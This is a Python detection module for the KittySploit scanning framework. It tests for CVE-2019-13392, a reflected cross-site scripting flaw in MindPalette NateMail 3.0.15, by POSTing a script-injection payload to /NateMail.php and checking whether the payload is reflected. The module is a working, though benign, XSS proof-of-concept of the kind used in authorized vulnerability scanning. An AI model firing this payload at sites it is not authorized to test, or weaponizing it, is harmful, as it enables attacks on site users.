#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""MindPalette NateMail 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'MindPalette NateMail 3.0.15 - Cross-Site Scripting Detection',
        'description': "MindPalette NateMail 3.0.15 is susceptible to reflected cross-site scripting which could allows an attacker to execute remote JavaScript in a victim's browser via a specially crafted POST request. The application will reflect the recipient value if it is not in the NateMail recipient array. Note that this array is keyed via integers by default, so any string input will be invalid.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'natemail', 'xss', 'mindpalette', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.doyler.net/security-not-included/natemail-vulnerabilities',
            'https://mindpalette.com/tag/natemail/',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-13392',
            'https://twitter.com/mindpalette',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2019-13392',
    }

    def run(self):
        path = '/NateMail.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}, data='recipient=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('</script><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='MindPalette NateMail 3.0.15 - Cross-Site Scripting detected', path=path)
            return True
        return False

